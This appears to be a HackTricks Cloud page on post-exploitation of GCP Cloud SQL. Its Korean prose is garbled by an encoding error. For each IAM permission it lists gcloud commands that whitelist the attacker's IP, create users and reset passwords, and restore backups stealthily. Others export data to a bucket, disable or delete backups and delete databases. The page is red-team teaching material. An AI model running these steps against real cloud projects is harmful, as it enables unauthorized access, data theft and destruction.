# GCP - Cloud SQL Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Cloud SQL

Cloud SQLì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../gcp-services/gcp-cloud-sql-enum.md" %}
[gcp-cloud-sql-enum.md](../gcp-services/gcp-cloud-sql-enum.md)
{% endcontent-ref %}

### `cloudsql.instances.update`, ( `cloudsql.instances.get`)

ë°ì´í„°ë² ì´ìŠ¤ì— ì—°ê²°í•˜ë ¤ë©´ **ë°ì´í„°ë² ì´ìŠ¤ í¬íŠ¸ì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œ**ê³¼ **ì‚¬ìš©ì ì´ë¦„** ë° **ë¹„ë°€ë²ˆí˜¸**ë¥¼ ì•Œì•„ì•¼ í•˜ë©°, IAM ìš”êµ¬ ì‚¬í•­ì€ ì—†ìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ë°ì´í„°ë² ì´ìŠ¤ì— ê³µìš© IP ì£¼ì†Œê°€ ìˆë‹¤ê³  ê°€ì •í•  ë•Œ ì ‘ê·¼í•˜ëŠ” ì‰¬ìš´ ë°©ë²•ì€ í—ˆìš©ëœ ë„¤íŠ¸ì›Œí¬ë¥¼ ì—…ë°ì´íŠ¸í•˜ê³  **ìì‹ ì˜ IP ì£¼ì†Œê°€ ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ í—ˆìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤**.
```bash
# Use --assign-ip to make the database get a public IPv4
gcloud sql instances patch $INSTANCE_NAME \
--authorized-networks "$(curl ifconfig.me)" \
--assign-ip \
--quiet

mysql -h <ip_db> # If mysql

# With cloudsql.instances.get you can use gcloud directly
gcloud sql connect mysql --user=root --quiet
```
**`--no-backup`**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì˜ **ë°±ì—…ì„ ì¤‘ë‹¨**í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.

ì´ê²ƒì´ ìš”êµ¬ ì‚¬í•­ì´ê¸° ë•Œë¬¸ì— **`cloudsql.instances.connect`** ë° **`cloudsql.instances.login`**ì˜ ê¶Œí•œì´ ë¬´ì—‡ì¸ì§€ í™•ì‹¤í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì•„ëŠ” ë¶„ì€ PRì„ ë³´ë‚´ì£¼ì„¸ìš”!

### `cloudsql.users.list`

ë°ì´í„°ë² ì´ìŠ¤ì˜ **ëª¨ë“  ì‚¬ìš©ì ëª©ë¡**ì„ ê°€ì ¸ì˜µë‹ˆë‹¤:
```bash
gcloud sql users list --instance <intance-name>
```
### `cloudsql.users.create`

ì´ ê¶Œí•œì€ **ë°ì´í„°ë² ì´ìŠ¤ ë‚´ì— ìƒˆë¡œìš´ ì‚¬ìš©ìë¥¼ ìƒì„±**í•  ìˆ˜ ìˆê²Œ í•´ì¤ë‹ˆë‹¤:
```bash
gcloud sql users create <username> --instance <instance-name> --password <password>
```
### `cloudsql.users.update`

ì´ ê¶Œí•œì€ **ë°ì´í„°ë² ì´ìŠ¤ ë‚´ì˜ ì‚¬ìš©ì ì—…ë°ì´íŠ¸**ë¥¼ í—ˆìš©í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
gcloud sql users set-password <username> --instance <instance-name> --password <password>
```
{% endcode %}

### `cloudsql.instances.restoreBackup`, `cloudsql.backupRuns.get`

ë°±ì—…ì—ëŠ” **ì˜¤ë˜ëœ ë¯¼ê°í•œ ì •ë³´**ê°€ í¬í•¨ë  ìˆ˜ ìˆìœ¼ë¯€ë¡œ í™•ì¸í•˜ëŠ” ê²ƒì´ í¥ë¯¸ë¡­ìŠµë‹ˆë‹¤.\
**ë°ì´í„°ë² ì´ìŠ¤ ë‚´ì—ì„œ ë°±ì—… ë³µì›**:
```bash
gcloud sql backups restore <backup-id> --restore-instance <instance-id>
```
ë” ì€ë°€í•˜ê²Œ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ í˜„ì¬ ì‹¤í–‰ ì¤‘ì¸ ë°ì´í„°ë² ì´ìŠ¤ ëŒ€ì‹  ìƒˆ SQL ì¸ìŠ¤í„´ìŠ¤ë¥¼ ìƒì„±í•˜ê³  ê·¸ê³³ì—ì„œ ë°ì´í„°ë¥¼ ë³µêµ¬í•˜ëŠ” ê²ƒì´ ê¶Œì¥ë©ë‹ˆë‹¤.

### `cloudsql.backupRuns.delete`

ì´ ê¶Œí•œì€ ë°±ì—…ì„ ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
gcloud sql backups delete <backup-id> --instance <instance-id>
```
### `cloudsql.instances.export`, `storage.objects.create`

**ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ë‚´ë³´ë‚´ê¸°** ìœ„í•´ Cloud Storage ë²„í‚·ìœ¼ë¡œ ë‚´ë³´ë‚´ì„œ ê±°ê¸°ì„œ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
# Export sql format, it could also be csv and bak
gcloud sql export sql <instance-id> <gs://bucketName/fileName>
```
### `cloudsql.instances.import`, `storage.objects.get`

**Cloud Storage ë²„í‚·ì—ì„œ ë°ì´í„°ë² ì´ìŠ¤ ê°€ì ¸ì˜¤ê¸°** (ë®ì–´ì“°ê¸°):
```bash
# Import format SQL, you could also import formats bak and csv
gcloud sql import sql <instance-id> <gs://bucketName/fileName>
```
### `cloudsql.databases.delete`

db ì¸ìŠ¤í„´ìŠ¤ì—ì„œ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì‚­ì œí•©ë‹ˆë‹¤:
```bash
gcloud sql databases delete <db-name> --instance <instance-id>
```
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
{% endhint %}
